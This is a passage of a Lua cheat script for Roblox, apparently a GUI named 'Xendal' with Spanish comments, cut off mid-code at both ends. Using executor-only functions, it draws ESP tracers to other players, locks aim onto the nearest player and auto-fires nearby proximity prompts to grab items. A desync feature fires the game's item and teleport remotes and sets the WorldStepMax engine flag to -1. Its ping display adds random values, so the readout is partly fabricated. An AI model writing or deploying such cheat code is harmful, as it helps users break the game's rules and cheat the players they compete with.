							local attachment0 = Instance.new("Attachment", LocalChar:WaitForChild("HumanoidRootPart"))
							beam.Attachment0 = attachment0
						end
					end
	
					-- Si no existe el beam, crear uno nuevo
					if not beam and getgenv().ESPTracers then
						local attachment0 = Instance.new("Attachment", LocalChar:WaitForChild("HumanoidRootPart"))
						local attachment1 = Instance.new("Attachment", PlayerChar:WaitForChild("HumanoidRootPart"))
	
						beam = Instance.new("Beam")
						beam.Name = "ESPBeam"
						beam.Attachment0 = attachment0
						beam.Attachment1 = attachment1
						beam.Color = ColorSequence.new(Color3.fromRGB(0, 0, 0))  -- Color del Beam
						beam.FaceCamera = true
						beam.Width0 = 0.15
						beam.Width1 = 0.15
						beam.Parent = PlayerChar  -- Asegurarse de que el Beam esté como hijo del personaje del jugador
					end
				end
			end
		end
	end
	
	-- Llamar a AssignTracers para asignar los beams al inicio
	AssignTracers()
	
	-- Asignar tracers cuando un nuevo jugador entre en el juego
	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function()
			repeat wait() until player.Character or wait(2)
			AssignTracers()
		end)
	end)
	
	-- Asignar tracers cuando el personaje del jugador local cambie
	LocalPlayer.CharacterAdded:Connect(function()
		repeat wait() until LocalPlayer.Character or wait(2)
		AssignTracers()
	end)
	
	-- Actualizar los tracers cuando el valor de ESPTracers cambie
	game:GetService("RunService").Heartbeat:Connect(function()
		for _, player in pairs(Players:GetPlayers()) do
			local PlayerChar = game.Workspace:FindFirstChild(player.Name)
			if PlayerChar then
				local beam = PlayerChar:FindFirstChild("ESPBeam")
				if beam then
					beam.Enabled = getgenv().ESPTracers  -- Habilitar o deshabilitar según el valor de ESPTracers
				end
			end
		end
	end)
	
	-- Función Toggle para cambiar el estado de activación/desactivación
	local function toggleESPTracers()
		getgenv().ESPTracers = not getgenv().ESPTracers  -- Alternar el estado de ESPTracers
	
		-- Actualizar el color del botón
		if getgenv().ESPTracers then
			button.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde cuando está activado
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está desactivado
		end
	
		AssignTracers()  -- Volver a asignar los tracers (si es necesario)
	end
	
	-- Conectar el evento al botón para alternar los tracers al hacer clic
	button.MouseButton1Click:Connect(toggleESPTracers)
	
end;
task.spawn(C_24d);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Main Handler
local function C_251()
local script = G2L["251"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(1) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_251);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Main Handler
local function C_25b()
local script = G2L["25b"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(1) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_25b);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Main Handler
local function C_265()
local script = G2L["265"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(1) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_265);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Animations
local function C_277()
local script = G2L["277"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.15
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_277);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Button.LocalScript
local function C_27d()
local script = G2L["27d"];
	local HttpService = game:GetService("HttpService")
	local baseFolder = "Swihz"
	local filePath = baseFolder .. "/" .. game.Players.LocalPlayer.Name .. "_fov.json"
	
	-- Función para guardar el valor de FOV en un archivo JSON
	local function saveFOV(fovValue)
		-- Verificar si la carpeta existe, si no, crearla
		if makefolder and not isfolder(baseFolder) then
			makefolder(baseFolder)
		end
	
		-- Crear el objeto de datos a guardar
		local data = { fov = fovValue }
	
		-- Guardar el objeto como un archivo JSON
		if writefile then
			writefile(filePath, HttpService:JSONEncode(data))
		end
	end
	
	-- Función para cargar el valor de FOV desde el archivo JSON
	local function loadFOV()
		-- Verificar si el archivo existe
		if isfile and isfile(filePath) then
			local raw = readfile(filePath)
			local success, data = pcall(function()
				return HttpService:JSONDecode(raw)
			end)
			if success and data and data.fov then
				return data.fov
			end
		end
		return 70 -- Valor por defecto (en caso de que no se haya guardado nada)
	end
	
	-- Establecer el FOV cargado al inicio
	local savedFOV = loadFOV()
	game.Workspace.CurrentCamera.FieldOfView = savedFOV  -- Se establece automáticamente el FOV cargado
	
	-- Función para manejar el ajuste del FOV cuando el botón es presionado
	script.Parent.MouseButton1Click:Connect(function()
		-- Obtener el valor de FOV del TextBox
		local fovText = tonumber(script.Parent.Parent.Parent.FOVSet.Text)
	
		-- Validar que el FOV esté dentro del rango permitido (70 - 120)
		if fovText and fovText >= 70 and fovText <= 120 then
			-- Establecer el nuevo valor de FOV en la cámara
			game.Workspace.CurrentCamera.FieldOfView = fovText
	
			-- Guardar el nuevo valor de FOV
			saveFOV(fovText)
	
			-- Animación de éxito
			local tweenTarget = UDim2.new(-1.042, 0, 3.23, 0)
			local tweenReturn = UDim2.new(-1.042, 0, 3.7, 0)
	
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(tweenTarget, "In", "Linear", 0.1, true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(tweenReturn, "In", "Linear", 0.1, true)
		else
			-- Si el valor de FOV no es válido, mostrar advertencia
			warn("Valor de FOV fuera del rango permitido. Debe estar entre 70 y 120.")
		end
	end)
	
end;
task.spawn(C_27d);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Button.Animations
local function C_27e()
local script = G2L["27e"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(120, 120, 120)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_27e);
-- StarterGui.Xendal.XendalInstaGrab.LocalScript
local function C_280()
local script = G2L["280"];
	--=============================--
	--    FRAME ARRASRTABLE + BOTONES
	--=============================--
	
	local guiFrame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	guiFrame.Active = true -- Muy importante para recibir Input
	
	local dragging = false
	local dragInput, dragStart, startPos
	
	-- Función para actualizar la posición
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar inicio de arrastre
	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			-- Detectar cuando suelta el mouse
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end
	
	-- Detectar movimiento del mouse
	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end
	
	-- Conectar InputChanged global para actualizar mientras arrastra
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
	-- Conectar eventos de Frame
	guiFrame.InputBegan:Connect(inputBegan)
	guiFrame.InputChanged:Connect(inputChanged)
	
	-- Conectar también todos los botones dentro del Frame
	for _, obj in pairs(guiFrame:GetDescendants()) do
		if obj:IsA("GuiButton") then
			obj.InputBegan:Connect(inputBegan)
			obj.InputChanged:Connect(inputChanged)
		end
	end
	
end;
task.spawn(C_280);
-- StarterGui.Xendal.XendalInstaGrab.TextButton.LocalScript
local function C_282()
local script = G2L["282"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local ContextActionService = game:GetService("ContextActionService")
	
	local player = Players.LocalPlayer
	local MAX_SEARCH_DISTANCE = 6
	local AUTO_ACTIVATE_DELAY = 1.3
	local currentPrompt = nil
	local isAutoActivating = false
	
	local button = script.Parent -- Asumiendo que el script está dentro de un TextButton
	
	-- 🔹 Obtener HRP
	local function getHRP()
		local char = player.Character
		if not char then return nil end
		return char:FindFirstChild("HumanoidRootPart")
	end
	
	-- 🔹 Buscar prompt más cercano
	local function findNearestPrompt()
		local hrp = getHRP()
		if not hrp then return nil end
		local nearest, nearestDist = nil, math.huge
		for _, prompt in ipairs(workspace:GetDescendants()) do
			if prompt:IsA("ProximityPrompt") and prompt.Enabled then
				local part = prompt:FindFirstAncestorWhichIsA("BasePart")
				if part then
					local dist = (hrp.Position - part.Position).Magnitude
					if dist <= MAX_SEARCH_DISTANCE and dist < nearestDist then
						nearest, nearestDist = prompt, dist
					end
				end
			end
		end
		return nearest
	end
	
	-- 🔹 Activar el prompt más cercano
	local function activatePrompt()
		currentPrompt = findNearestPrompt()
		if currentPrompt then
			pcall(function()
				fireproximityprompt(currentPrompt, math.huge)
				currentPrompt:InputHoldBegin()
				currentPrompt:InputHoldEnd()
			end)
		end
	end
	
	-- 🔹 Loop automático mientras haya prompt
	local function startAutoActivate()
		if isAutoActivating then return end
		isAutoActivating = true
	
		task.spawn(function()
			while isAutoActivating do
				local nearest = findNearestPrompt()
				if not nearest then
					break -- no hay prompts cerca → detener
				end
				activatePrompt()
				task.wait(AUTO_ACTIVATE_DELAY)
			end
	
			-- 🔹 Detener
			isAutoActivating = false
		end)
	end
	
	-- 🔹 Evento de activación del TextButton
	button.Activated:Connect(function()
		if not isAutoActivating then
			startAutoActivate()
		else
			isAutoActivating = false
		end
	end)
	
	-- 🔹 Función para activar con la tecla Q
	local function onKeyPress(input, gameProcessedEvent)
		if gameProcessedEvent then return end
		if input.KeyCode == Enum.KeyCode.Q then
			if not isAutoActivating then
				startAutoActivate()
			else
				isAutoActivating = false
			end
		end
	end
	
	-- Conectar el evento de presionar tecla
	UserInputService.InputBegan:Connect(onKeyPress)
	
	-- 🔹 Inicializar
	local function initialize()
	
	end
	
	if player.Character then
		initialize()
	else
		player.CharacterAdded:Once(initialize)
	end
	
end;
task.spawn(C_282);
-- StarterGui.Xendal.XendalCloner.LocalScript
local function C_286()
local script = G2L["286"];
	--=============================--
	--    FRAME ARRASRTABLE + BOTONES
	--=============================--
	
	local guiFrame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	guiFrame.Active = true -- Muy importante para recibir Input
	
	local dragging = false
	local dragInput, dragStart, startPos
	
	-- Función para actualizar la posición
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar inicio de arrastre
	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			-- Detectar cuando suelta el mouse
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end
	
	-- Detectar movimiento del mouse
	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end
	
	-- Conectar InputChanged global para actualizar mientras arrastra
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
	-- Conectar eventos de Frame
	guiFrame.InputBegan:Connect(inputBegan)
	guiFrame.InputChanged:Connect(inputChanged)
	
	-- Conectar también todos los botones dentro del Frame
	for _, obj in pairs(guiFrame:GetDescendants()) do
		if obj:IsA("GuiButton") then
			obj.InputBegan:Connect(inputBegan)
			obj.InputChanged:Connect(inputChanged)
		end
	end
	
end;
task.spawn(C_286);
-- StarterGui.Xendal.XendalCloner.TextButton.LocalScript
local function C_288()
local script = G2L["288"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local TOOL_NAME = "Quantum Cloner"
	local button = script.Parent 
	
	-- Función principal de Mobile Desync
	local function enableMobileDesync()
		local success, error = pcall(function()
			local backpack = LocalPlayer:WaitForChild("Backpack")
			local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
			local humanoid = character:WaitForChild("Humanoid")
	
			local packages = ReplicatedStorage:WaitForChild("Packages", 5)
			if not packages then warn("") return false end
	
			local netFolder = packages:WaitForChild("Net", 5)
			if not netFolder then warn("") return false end
	
			local useItemRemote = netFolder:WaitForChild("RE/UseItem", 5)
			local teleportRemote = netFolder:WaitForChild("RE/QuantumCloner/OnTeleport", 5)
			if not useItemRemote or not teleportRemote then warn("") return false end
	
			-- Buscar la herramienta en el inventario
			local toolNames = {"Quantum Cloner", "Brainrot", "brainrot"}
			local tool
			for _, toolName in ipairs(toolNames) do
				tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
				if tool then break end
			end
			if not tool then
				for _, item in ipairs(backpack:GetChildren()) do
					if item:IsA("Tool") then
						tool = item
						break
					end
				end
			end
	
			if tool and tool.Parent == backpack then
				humanoid:EquipTool(tool)
			end
	
			-- Activar desync
			if setfflag then setfflag("WorldStepMax", "-1") end
			useItemRemote:FireServer()
			teleportRemote:FireServer()
			if setfflag then setfflag("WorldStepMax", "-1") end
			return true
		end)
	
		if not success then
			warn("" .. tostring(error))
			return false
		end
		return success
	end
	
	local function disableMobileDesync()
		pcall(function()
			if setfflag then setfflag("WorldStepMax", "-1") end
		end)
	end
	
	-- Función para activar la herramienta
	local function activateTool()
		-- Esperar que la mochila y el personaje estén disponibles
		local backpack = LocalPlayer:WaitForChild("Backpack")
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
	
		-- Buscar la herramienta en la mochila o en el personaje
		local tool = backpack:FindFirstChild(TOOL_NAME) or character:FindFirstChild(TOOL_NAME)
	
		-- Si no la encontramos, buscar en cualquier herramienta del inventario
		if not tool then
			for _, item in ipairs(backpack:GetChildren()) do
				if item:IsA("Tool") then
					tool = item
					break
				end
			end
		end
	
		-- Si encontramos la herramienta, equiparla y activarla
		if tool then
			humanoid:EquipTool(tool)
	
			-- Activar la herramienta
			if tool:FindFirstChild("Activated") then
				tool.Activated:Fire()  -- Si la herramienta tiene un evento Activated
			elseif tool:IsA("Tool") and tool:FindFirstChild("Activate") then
				tool:Activate()  -- Algunas herramientas tienen una función Activate
			end
			return true
		else
			return false
		end
	end
	
	-- Función para realizar la acción cuando se hace clic en el botón
	local function onButtonClick()
		local success = activateTool()  -- Activar la herramienta
		if success then
			enableMobileDesync()  -- Activar Mobile Desync
		end
	end
	
	-- Conectar el evento de clic al botón
	button.MouseButton1Click:Connect(onButtonClick)
	
end;
task.spawn(C_288);
-- StarterGui.Xendal.XendalAimlock.LocalScript
local function C_28c()
local script = G2L["28c"];
	--=============================--
	--    FRAME ARRASRTABLE + BOTONES
	--=============================--
	
	local guiFrame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	guiFrame.Active = true -- Muy importante para recibir Input
	
	local dragging = false
	local dragInput, dragStart, startPos
	
	-- Función para actualizar la posición
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar inicio de arrastre
	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			-- Detectar cuando suelta el mouse
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end
	
	-- Detectar movimiento del mouse
	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end
	
	-- Conectar InputChanged global para actualizar mientras arrastra
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
	-- Conectar eventos de Frame
	guiFrame.InputBegan:Connect(inputBegan)
	guiFrame.InputChanged:Connect(inputChanged)
	
	-- Conectar también todos los botones dentro del Frame
	for _, obj in pairs(guiFrame:GetDescendants()) do
		if obj:IsA("GuiButton") then
			obj.InputBegan:Connect(inputBegan)
			obj.InputChanged:Connect(inputChanged)
		end
	end
	
end;
task.spawn(C_28c);
-- StarterGui.Xendal.XendalAimlock.TextButton.LocalScript
local function C_28e()
local script = G2L["28e"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local player = Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local hrp = char:WaitForChild("HumanoidRootPart")
	
	local button = script.Parent -- TextButton
	local isEnabled = false
	local connection
	
	local OFF_COLOR = Color3.fromRGB(255,255,255)
	local ON_COLOR = Color3.fromRGB(0, 0, 0) -- azul
	
	local MAX_DISTANCE = 25 -- <<< RANGO MAXIMO
	
	local function getClosestTarget()
		local closest, dist = nil, MAX_DISTANCE
	
		for _,plr in pairs(Players:GetPlayers()) do
			if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local t = plr.Character.HumanoidRootPart
				local d = (t.Position - hrp.Position).Magnitude
	
				if d <= dist then
					dist = d
					closest = t
				end
			end
		end
	
		return closest
	end
	
	local function activate()
		connection = RunService.RenderStepped:Connect(function()
			local target = getClosestTarget()
			if not target then return end
	
			-- Solo gira en horizontal (no se traba al saltar)
			local lookPos = Vector3.new(target.Position.X, hrp.Position.Y, target.Position.Z)
			hrp.CFrame = CFrame.new(hrp.Position, lookPos)
		end)
	end
	
	local function deactivate()
		if connection then
			connection:Disconnect()
			connection = nil
		end
	end
	
	local function toggle()
		if isEnabled then
			deactivate()
			button.TextColor3 = OFF_COLOR
		else
			activate()
			button.TextColor3 = ON_COLOR
		end
		isEnabled = not isEnabled
	end
	
	button.MouseButton1Click:Connect(toggle)
	
end;
task.spawn(C_28e);
-- StarterGui.Xendal.XendalFps.LocalScript
local function C_292()
local script = G2L["292"];
	-- Referencia al Frame principal de tu GUI
	local guiFrame = script.Parent
	
	-- Variables para el arrastre
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar cuando empieza a arrastrar
	guiFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or
			input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Detectar movimiento
	guiFrame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or
			input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	-- Actualizar la posición mientras arrastra
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
end;
task.spawn(C_292);
-- StarterGui.Xendal.XendalFps.fpsLabel.LocalScript
local function C_294()
local script = G2L["294"];
	local textLabel = script.Parent -- Asegúrate de que el script esté dentro del TextLabel
	
	local function updateFPS()
		while true do
			-- Obtiene los FPS actuales
			local fps = math.floor(1 / game:GetService("RunService").Heartbeat:Wait())
	
			-- Cambia el texto del TextLabel para mostrar solo el FPS
			textLabel.Text = fps .. " FPS"  -- Muestra solo el valor de los FPS
	
			-- Si los FPS son menores a 20, cambia el color a rojo
			if fps < 20 then
				textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)  -- Rojo si FPS < 20
			else
				textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco para FPS normales
			end
	
			-- Opcional: Añade un pequeño delay para evitar un uso excesivo de CPU
			wait(0.1)  -- Actualiza el valor de los FPS cada 0.1 segundos
		end
	end
	
	-- Llama a la función para comenzar a actualizar los FPS
	updateFPS()
	
end;
task.spawn(C_294);
-- StarterGui.Xendal.XendalPing.LocalScript
local function C_297()
local script = G2L["297"];
	-- Referencia al Frame principal de tu GUI
	local guiFrame = script.Parent
	
	-- Variables para el arrastre
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar cuando empieza a arrastrar
	guiFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or
			input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Detectar movimiento
	guiFrame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or
			input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	-- Actualizar la posición mientras arrastra
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
end;
task.spawn(C_297);
-- StarterGui.Xendal.XendalPing.PingLabel.LocalScript
local function C_299()
local script = G2L["299"];
	local textLabel = script.Parent -- Asegúrate de que el script esté dentro del TextLabel
	
	local function updatePing()
		local frameCount = 0
		local lastUpdate = tick()
		local ping = 0
	
		-- Bucle de actualización del ping
		while true do
			local start = tick()
			pcall(function() game:HttpGet("https://api.roblox.com/robots.txt") end)  -- Calcula el ping
			ping = math.floor((tick() - start) * 1000 + math.random(1, 5))  -- Calcula el ping y agrega un pequeño rango aleatorio para simular fluctuaciones
	
			-- Actualiza el texto del TextLabel con el valor del ping solo
			textLabel.Text = ping .. " MS"  -- Solo muestra el ping (por ejemplo, "50 MS")
	
			-- Cambia el color a rojo si el ping es mayor a 300
			if ping > 300 then
				textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)  -- Rojo para pings mayores a 300 ms
			else
				textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco para pings más bajos
			end
	
			-- Espera para no usar demasiados recursos
			wait(1)  -- Actualiza el valor del ping cada segundo
		end
	end
	
	-- Llama a la función para comenzar a actualizar el Ping
	updatePing()
	
end;
task.spawn(C_299);
-- StarterGui.Xendal.XendalFly.LocalScript
local function C_29c()
local script = G2L["29c"];
	--=============================--
	--    FRAME ARRASRTABLE + BOTONES
	--=============================--
	
	local guiFrame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	guiFrame.Active = true -- Muy importante para recibir Input
	
	local dragging = false
	local dragInput, dragStart, startPos
	
	-- Función para actualizar la posición
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
